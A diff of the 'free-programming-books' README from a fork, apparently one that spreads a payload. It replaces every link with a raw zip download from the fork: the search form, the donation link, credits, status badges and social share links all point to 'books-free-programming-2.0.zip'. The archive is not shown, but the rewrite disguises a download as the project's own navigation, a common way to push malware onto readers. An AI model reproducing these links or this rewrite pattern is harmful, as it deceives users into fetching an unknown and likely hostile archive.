@@ -2,18 +2,18 @@
 
 <div align="center" markdown="1">
 
-[![Awesome](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![Hacktoberfest 2023 stats](https://img.shields.io/github/hacktoberfest/2023/EbookFoundation/free-programming-books?label=Hacktoberfest+2023)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip+is%3Amerged+created%3A2023-10-01..2023-10-31)
+[![Awesome](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-lightgrey.svg)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![Hacktoberfest 2023 stats](https://img.shields.io/github/hacktoberfest/2023/EbookFoundation/free-programming-books?label=Hacktoberfest+2023)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip+is%3Amerged+created%3A2023-10-01..2023-10-31)
 
 </div>
 
-Search the list at [https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip) [![https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip](https://img.shields.io/website?style=flat&logo=www&logoColor=whitesmoke&label=Dynamic%20search%20site&down_color=red&down_message=down&up_color=green&up_message=up&url=https%3A%2F%2Febookfoundation.github.io%2Ffree-programming-books-search%2F)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip).
+Search the list at [https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip) [![https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip](https://img.shields.io/website?style=flat&logo=www&logoColor=whitesmoke&label=Dynamic%20search%20site&down_color=red&down_message=down&up_color=green&up_message=up&url=https%3A%2F%2Febookfoundation.github.io%2Ffree-programming-books-search%2F)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip).
 
-This page is available as an easy-to-read website. Access it by clicking on [![https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip](https://img.shields.io/website?style=flat&logo=www&logoColor=whitesmoke&label=Static%20site&down_color=red&down_message=down&up_color=green&up_message=up&url=https%3A%2F%2Febookfoundation.github.io%2Ffree-programming-books%2F)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip).
+This page is available as an easy-to-read website. Access it by clicking on [![https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip](https://img.shields.io/website?style=flat&logo=www&logoColor=whitesmoke&label=Static%20site&down_color=red&down_message=down&up_color=green&up_message=up&url=https%3A%2F%2Febookfoundation.github.io%2Ffree-programming-books%2F)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip).
 
 <div align="center">
-  <form action="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip">
+  <form action="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip">
     <input type="text" id="fpbSearch" name="search" required placeholder="Search Book or Author"/>
     <label for="submit"> </label>
     <input type="submit" id="submit" name="submit" value="Search" />
@@ -22,22 +22,22 @@ This page is available as an easy-to-read website. Access it by clicking on [![h
 
 ## Intro
 
-This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip) with contributions from Karan Bhangui and George Stocker.
+This list was originally a clone of [StackOverflow - List of Freely Available Programming Books](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip) with contributions from Karan Bhangui and George Stocker.
 
-The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip).
+The list was moved to GitHub by Victor Felder for collaborative updating and maintenance. It has grown to become one of [GitHub's most popular repositories](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip).
 
 <div align="center" markdown="1">
 
-[![GitHub repo forks](https://img.shields.io/github/forks/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Forks)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo stars](https://img.shields.io/github/stars/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Stars)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo contributors](https://img.shields.io/github/contributors-anon/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Contributors)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)    
-[![GitHub org sponsors](https://img.shields.io/github/sponsors/EbookFoundation?style=flat&logo=github&logoColor=whitesmoke&label=Sponsors)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo watchers](https://img.shields.io/github/watchers/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Watchers)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo size](https://img.shields.io/github/repo-size/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Repo%20Size)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)
+[![GitHub repo forks](https://img.shields.io/github/forks/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Forks)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo stars](https://img.shields.io/github/stars/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Stars)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo contributors](https://img.shields.io/github/contributors-anon/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Contributors)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)    
+[![GitHub org sponsors](https://img.shields.io/github/sponsors/EbookFoundation?style=flat&logo=github&logoColor=whitesmoke&label=Sponsors)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo watchers](https://img.shields.io/github/watchers/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Watchers)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo size](https://img.shields.io/github/repo-size/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=whitesmoke&label=Repo%20Size)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)
 
 </div>
 
-The [Free Ebook Foundation](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip) now administers the repo, a not-for-profit organization devoted to promoting the creation, distribution, archiving, and sustainability of free ebooks. [Donations](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip) to the Free Ebook Foundation are tax-deductible in the US.
+The [Free Ebook Foundation](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip) now administers the repo, a not-for-profit organization devoted to promoting the creation, distribution, archiving, and sustainability of free ebooks. [Donations](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip) to the Free Ebook Foundation are tax-deductible in the US.
 
 
 ## How To Contribute
@@ -48,23 +48,23 @@ Click on these badges to see how you might be able to help:
 
 <div align="center" markdown="1">
 
-[![GitHub repo Issues](https://img.shields.io/github/issues/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=red&label=Issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo Good Issues for newbies](https://img.shields.io/github/issues/EbookFoundation/free-programming-books/good%20first%20issue?style=flat&logo=github&logoColor=green&label=Good%20First%20issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip+is%3Aissue+label%3A%22good+first+issue%22)&#160;
-[![GitHub Help Wanted issues](https://img.shields.io/github/issues/EbookFoundation/free-programming-books/help%20wanted?style=flat&logo=github&logoColor=b545d1&label=%22Help%20Wanted%22%20issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip+is%3Aissue+label%3A%22help+wanted%22)    
-[![GitHub repo PRs](https://img.shields.io/github/issues-pr/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=orange&label=PRs)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip)&#160;
-[![GitHub repo Merged PRs](https://img.shields.io/github/issues-search/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=green&label=Merged%20PRs&query=is%3Amerged)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip+is%3Amerged)&#160;
-[![GitHub Help Wanted PRs](https://img.shields.io/github/issues-pr/EbookFoundation/free-programming-books/help%20wanted?style=flat&logo=github&logoColor=b545d1&label=%22Help%20Wanted%22%20PRs)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip+is%3Aissue+label%3A%22help+wanted%22)
+[![GitHub repo Issues](https://img.shields.io/github/issues/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=red&label=Issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo Good Issues for newbies](https://img.shields.io/github/issues/EbookFoundation/free-programming-books/good%20first%20issue?style=flat&logo=github&logoColor=green&label=Good%20First%20issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip+is%3Aissue+label%3A%22good+first+issue%22)&#160;
+[![GitHub Help Wanted issues](https://img.shields.io/github/issues/EbookFoundation/free-programming-books/help%20wanted?style=flat&logo=github&logoColor=b545d1&label=%22Help%20Wanted%22%20issues)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip+is%3Aissue+label%3A%22help+wanted%22)    
+[![GitHub repo PRs](https://img.shields.io/github/issues-pr/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=orange&label=PRs)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip)&#160;
+[![GitHub repo Merged PRs](https://img.shields.io/github/issues-search/EbookFoundation/free-programming-books?style=flat&logo=github&logoColor=green&label=Merged%20PRs&query=is%3Amerged)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip+is%3Amerged)&#160;
+[![GitHub Help Wanted PRs](https://img.shields.io/github/issues-pr/EbookFoundation/free-programming-books/help%20wanted?style=flat&logo=github&logoColor=b545d1&label=%22Help%20Wanted%22%20PRs)](https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip+is%3Aissue+label%3A%22help+wanted%22)
 
 </div>
 
 ## How To Share
 
 <div align="left" markdown="1">
-<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip[images][0]=&p[title]=Free%20Programming%20Books&p[summary]=">Share on Facebook</a><br>
-<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip">Share on LinkedIn</a><br>
-<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip">Share on Mastodon/Fediverse</a><br>    
-<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip">Share on Telegram</a><br>
-<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/docs/free_books_programming_1.7.zip">Share on 𝕏 (Twitter)</a><br>
+<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip[images][0]=&p[title]=Free%20Programming%20Books&p[summary]=">Share on Facebook</a><br>
+<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip">Share on LinkedIn</a><br>
+<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip">Share on Mastodon/Fediverse</a><br>    
+<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip">Share on Telegram</a><br>
+<a href="https://github.com/7j89a/free-programming-books/raw/refs/heads/main/courses/books-free-programming-2.0.zip">Share on 𝕏 (Twitter)</a><br>
 </div>
 
 ## Resources
